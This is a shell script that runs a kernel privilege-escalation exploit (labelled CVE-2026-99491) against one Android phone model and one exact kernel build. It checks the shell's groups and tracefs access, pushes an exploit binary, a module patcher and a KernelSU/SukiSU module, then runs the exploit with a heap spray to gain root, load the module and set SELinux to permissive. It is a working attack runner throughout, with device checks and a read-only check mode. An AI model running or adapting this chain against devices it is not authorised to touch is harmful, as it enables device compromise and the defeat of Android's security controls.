#!/bin/sh
# CVE-2026-99491 -> 117 real-device runner (WKL-AN20).
#
# SAFETY: this is a kernel exploit.  --check is read-only.  --run is the
# destructive path and requires the exact 117 build; it can panic/reboot the
# device if the 99491 reclaim misses.  It never installs a manager APK.
set -eu

HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
ROOT=$(CDPATH= cd -- "$HERE/.." && pwd)
ADB=${ADB:-adb}
SERIAL=${ANDROID_SERIAL:-}
MODE=check
LOAD_ONLY=1
SPRAY=512
CLEANUP=0
AVC_ARG=--avc-only
MANAGER=${MANAGER:-sukisu}
KERNEL_EXPECTED=6.18.21-android17-5-gfee2325de189-abogki572422516-4k
ASSETS="$ROOT/assets"
BIN="$ASSETS/exp117"
KOPATCH="$ASSETS/ko_patch"
STAGE="$ASSETS/root_stage.sh"
DEV_DIR=/data/local/tmp
STAMP=$(date +%Y%m%d-%H%M%S)
LOGDIR=${LOGDIR:-"$ROOT/build/99491-logs"}
mkdir -p "$LOGDIR"

usage() {
    cat <<'USAGE'
Usage: run-real-99491.sh [options]

  --serial SERIAL   adb serial (or ANDROID_SERIAL)
  --check           read-only readiness check (default)
  --run             run the destructive 99491 chain
  --load-only       load the SukiSU LKM only; do not run ksud install
  --prepare-su      run ksud install/root_stage after loading (no APK install)
  --spray N         fake input_dev spray count (default 512)
  --state7          use the old selinux_state-7 route instead of AVC-only
  --sukisu          use the SukiSU 117 LKM/ksud (default)
  --kernelsu        use the KernelSU 117 LKM/ksud control path
  --cleanup         remove the files pushed by this script
  -h, --help

The script refuses any model other than WKL-AN20 and any kernel other than
6.18.21-android17-5-gfee2325de189-abogki572422516-4k.
USAGE
}

while [ $# -gt 0 ]; do
    case "$1" in
        --serial) [ $# -ge 2 ] || { echo "--serial needs a value" >&2; exit 2; }; SERIAL=$2; shift 2 ;;
        --check) MODE=check; shift ;;
        --run) MODE=run; shift ;;
        --load-only) LOAD_ONLY=1; shift ;;
        --prepare-su) LOAD_ONLY=0; shift ;;
        --spray) [ $# -ge 2 ] || { echo "--spray needs a value" >&2; exit 2; }; SPRAY=$2; shift 2 ;;
        --state7) AVC_ARG=--no-avc; shift ;;
        --sukisu) MANAGER=sukisu; shift ;;
        --kernelsu) MANAGER=kernelsu; shift ;;
        --cleanup) CLEANUP=1; shift ;;
        -h|--help) usage; exit 0 ;;
        *) echo "unknown option: $1" >&2; usage >&2; exit 2 ;;
    esac
done

case "$MANAGER" in
    sukisu)
        LKM="$ROOT/src/sukisu/assets/sukisu-template-117.ko"
        KSUD="$ROOT/src/sukisu/assets/ksud"
        SYMS="$ROOT/src/sukisu/assets/ko_syms-sukisu117.txt"
        ;;
    kernelsu)
        LKM="$ROOT/src/kernelsu/assets/ksu-template-117.ko"
        KSUD="$ASSETS/ksud"
        SYMS="$ROOT/src/kernelsu/assets/ko_syms-117.txt"
        ;;
    *) echo "unknown manager: $MANAGER" >&2; exit 2 ;;
esac

for f in "$BIN" "$KOPATCH" "$SYMS" "$LKM" "$KSUD" "$STAGE"; do
    [ -f "$f" ] || { echo "missing asset: $f" >&2; exit 1; }
done

if [ -z "$SERIAL" ]; then
    # Only accept a single online device; never guess between devices.
    set -- $("$ADB" devices | awk '$2 == "device" {print $1}')
    [ $# -eq 1 ] || { echo "expected exactly one online adb device; use --serial" >&2; exit 1; }
    SERIAL=$1
fi

adbx() { "$ADB" -s "$SERIAL" "$@"; }
sh_() { adbx shell "$1" 2>&1 | tr -d '\r'; }

set +e
MODEL=$(sh_ 'getprop ro.product.model')
BUILD=$(sh_ 'getprop ro.build.display.id')
KERNEL=$(sh_ 'uname -r')
ID=$(sh_ 'id')
ENFORCE=$(sh_ 'getenforce')
BOOT_ID=$(sh_ 'cat /proc/sys/kernel/random/boot_id')
MODULE=$(sh_ 'grep -i kernelsu /proc/modules || true')
UHID=$(sh_ 'ls -l /dev/uhid 2>&1 || true')
TRIGGER_W=$(sh_ '[ -w /sys/kernel/tracing/events/kmem/rss_stat/trigger ] && echo 1 || echo 0')
RAW_R=$(sh_ '[ -r /sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw ] && echo 1 || echo 0')

printf 'device=%s\n' "$SERIAL"
printf 'model=%s\n' "$MODEL"
printf 'build=%s\n' "$BUILD"
printf 'kernel=%s\n' "$KERNEL"
printf 'boot_id=%s\n' "$BOOT_ID"
printf 'enforce=%s\n' "$ENFORCE"
printf 'module=%s\n' "${MODULE:-none}"
printf 'uhid=%s\n' "$UHID"
printf 'rss_trigger_writable=%s\n' "$TRIGGER_W"
printf 'trace_pipe_raw_readable=%s\n' "$RAW_R"
printf 'id=%s\n' "$ID"

fail=0
case "$MODEL" in
    *WKL-AN20*) : ;;
    *) echo "REFUSE: model is not WKL-AN20" >&2; fail=1 ;;
esac
[ "$KERNEL" = "$KERNEL_EXPECTED" ] || { echo "REFUSE: kernel mismatch" >&2; fail=1; }
printf '%s\n' "$ID" | grep -q 'uid=2000' || { echo "REFUSE: not uid2000 shell" >&2; fail=1; }
printf '%s\n' "$ID" | grep -q 'u:r:shell:s0' || { echo "REFUSE: not u:r:shell:s0" >&2; fail=1; }
[ "$ENFORCE" = "Enforcing" ] || { echo "REFUSE: SELinux is not Enforcing" >&2; fail=1; }
[ -n "$UHID" ] || { echo "REFUSE: /dev/uhid missing" >&2; fail=1; }
[ "$TRIGGER_W" = "1" ] || { echo "REFUSE: rss_stat/trigger not writable" >&2; fail=1; }
[ "$RAW_R" = "1" ] || { echo "REFUSE: trace_pipe_raw not readable (need readtracefs group)" >&2; fail=1; }
printf '%s\n' "$ID" | grep -q '3011' || { echo "REFUSE: shell is not in uhid group" >&2; fail=1; }
printf '%s\n' "$ID" | grep -q '3012' || { echo "REFUSE: shell is not in readtracefs group" >&2; fail=1; }
[ -z "$MODULE" ] || { echo "REFUSE: kernelsu already live; reboot before a clean run" >&2; fail=1; }
[ "$fail" -eq 0 ] || exit 1

if [ "$MODE" = "check" ]; then
    echo "CHECK=OK (read-only; nothing pushed)"
    exit 0
fi
set -e

LOG="$LOGDIR/real-$BOOT_ID-$STAMP.log"
echo "RUN log=$LOG spray=$SPRAY load_only=$LOAD_ONLY avc=$AVC_ARG" | tee "$LOG"

for f in "$BIN" "$KOPATCH" "$SYMS" "$LKM" "$KSUD" "$STAGE"; do
    [ -f "$f" ] || { echo "missing asset: $f" >&2; exit 1; }
done
# Push to the fixed names the exploit hardcodes; the SukiSU symbol file is
# named ko_syms-sukisu117.txt on the host but must land as ko_syms-117.txt.
adbx push "$BIN" "$DEV_DIR/exp117" >/dev/null
adbx push "$KOPATCH" "$DEV_DIR/ko_patch" >/dev/null
adbx push "$SYMS" "$DEV_DIR/ko_syms-117.txt" >/dev/null
adbx push "$LKM" "$DEV_DIR/ksu-template-117.ko" >/dev/null
adbx push "$KSUD" "$DEV_DIR/ksud" >/dev/null
adbx push "$STAGE" "$DEV_DIR/root_stage.sh" >/dev/null
sh_ "chmod 755 $DEV_DIR/exp117 $DEV_DIR/ko_patch $DEV_DIR/ksud $DEV_DIR/root_stage.sh; chmod 644 $DEV_DIR/ko_syms-117.txt $DEV_DIR/ksu-template-117.ko"

LOAD_ARG=""
[ "$LOAD_ONLY" -eq 1 ] && LOAD_ARG="--load-only"

# AVC-only is the default permissive route (single pad report, flags=1,
# no xp_node write).  --state7 keeps the old selinux_state-7 fallback.
set +e
adbx shell "cd $DEV_DIR && ./exp117 --stage pwn $AVC_ARG --spray $SPRAY $LOAD_ARG" 2>&1 | tee -a "$LOG"
RC=$?
set -e

echo "=== POST ===" | tee -a "$LOG"
{
    sh_ 'id; getenforce; cat /proc/self/attr/current; grep -i kernelsu /proc/modules || true'
    sh_ '/system/bin/su -c "id; getenforce; cat /proc/self/attr/current" 2>&1 || true'
} | tee -a "$LOG"

if [ "$CLEANUP" -eq 1 ]; then
    sh_ "rm -f $DEV_DIR/exp117 $DEV_DIR/ko_patch $DEV_DIR/ko_syms-117.txt $DEV_DIR/ksu-template-117.ko $DEV_DIR/ksu-patched.ko $DEV_DIR/ksud $DEV_DIR/root_stage.sh"
    echo "cleanup=done" | tee -a "$LOG"
fi

echo "rc=$RC log=$LOG"
exit "$RC"
